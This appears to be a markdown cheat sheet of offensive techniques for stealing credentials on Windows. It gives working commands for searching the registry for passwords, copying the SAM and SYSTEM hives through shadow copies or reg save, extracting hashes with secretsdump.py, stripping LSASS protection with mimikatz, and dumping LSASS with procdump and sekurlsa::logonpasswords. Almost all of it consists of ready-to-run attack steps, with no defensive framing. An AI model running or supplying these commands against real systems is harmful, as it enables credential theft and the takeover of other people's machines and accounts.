# 1-Find Clear-Text Files:
- **Powershell History**:
```
Path: C:\<UserName>\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
- **Registry: find password keyword**:
```
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```
- **Also look for:**
  - Database Files
  - Memory Dump
  - Active Directory.Users' description
  - Network Sniffing

# 2-Key Logging

# 3-SAM Database:
  - Path: c:\Windows\System32\config\sam
  - we can not read it and copy it
  - SAM database is encrypted either with RC4 or AES.we need a decryption key which is also stored in the files system in **c:\Windows\System32\Config\system** 
    ### how to Dump:
    - 1-MetaSploit.hashdump
    - 2-Microsoft Volume shadow copy:
        ```
        wmic shadowcopy call create Volume='C:\'
        #find where it is stored
        vssadmin list shadows
        copy \\path\to\volume\sam  \\somewhere-Else
        copy \\path\to\volume\\system \\soemwhere-Else
        ```
# 4-Registry Hives:
```
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
#Extract
secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

# 5-Dump LSASS(cached credentials):
  - **Protected LSASS**:
    - disable from Registry:
    ```
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    ```
    - disable with mimikatz:
    ```
    mimikatz # !+
    mimikatz # !processprotect /process:lsass.exe /remove
    ```

  - 5.1-Using GUI with Task-Manager
  - 5.2-Using procdump
  ```
  procdump.exe -accepteula -ma lsass.exe c:\<somewhere>
  ```
  - 5.3-mimikatz
  ```
  mimikatz # sekurlsa::logonpasswords
  ```
